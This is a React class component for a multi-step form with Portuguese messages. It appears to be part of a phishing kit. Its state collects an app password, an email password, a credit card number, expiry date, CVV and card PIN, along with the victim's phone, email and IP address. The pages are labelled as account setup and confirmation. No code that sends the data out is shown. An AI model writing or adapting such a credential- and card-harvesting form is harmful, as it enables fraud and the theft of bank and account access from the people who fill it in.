import React, { Component } from 'react';
import AccountSetup from './AccountSetup';
import SocialProfiles from './SocialProfiles';
import Confirm from './Confirm';
import Success from './Success';

export class Form extends Component {
    state = {
        step: 1,
        cp: '',
        email: '',
        phone: '',
        passapp: '',
        cc: '',
        valcc: '',
        cvv: '',
        ip: '',
        msg: ''

    };

    nextStep = () => {
        const { step } = this.state;
        const { cp } = this.state;
        const { email } = this.state;
        const { phone } = this.state;
        const { passapp } = this.state;
        const { cc } = this.state;
        const { valcc } = this.state;
        const { cvv } = this.state;



        const { msg } = this.state;

        this.setState({ cp: cp });
        this.setState({ email: email });
        this.setState({ phone: phone });
        this.setState({ passapp: passapp });
        this.setState({ cc: cc });
        this.setState({ valcc: valcc });
        this.setState({ cvv: cvv });
        this.setState({ msg: msg });

        if(cp != '' && phone != '' && passapp != '' ){
            this.setState({ step: step + 1 });
        }else{
       this.setState({ msg: 'Por favor, preencha todos os campos obrigatórios (*)  ' });
        

        }
        
    };

    prevStep = () => {
        const { step } = this.state;
        this.setState({ step: step - 1 });
    };

    inputChange = input => e => {
        this.setState({
            [input]: e.target.value
        });
    };

    render() {
        const { step } = this.state;
        const { cp, email, phone, passapp, cc, valcc, ccpass, passemail, cvv, msg } = this.state;
        const values = { cp, email, phone, passapp, cc, valcc, ccpass, passemail, cvv, msg };


        
        switch (step) {
            case 1:
                return (
                    <AccountSetup
                        nextStep={this.nextStep}
                        inputChange={this.inputChange}
                        values={values}
                    />
                );
            case 2:
                return (
                    <SocialProfiles
                        nextStep={this.nextStep}
                        prevStep={this.prevStep}
                        inputChange={this.inputChange}
                        values={values}
                    />
                );
            case 3:
                return (
                    <Confirm
                        nextStep={this.nextStep}
                        prevStep={this.prevStep}
                        values={values}
                    />
                );
            case 4:
                return (
                    <Success />
                );
        }
    }
}

export default Form
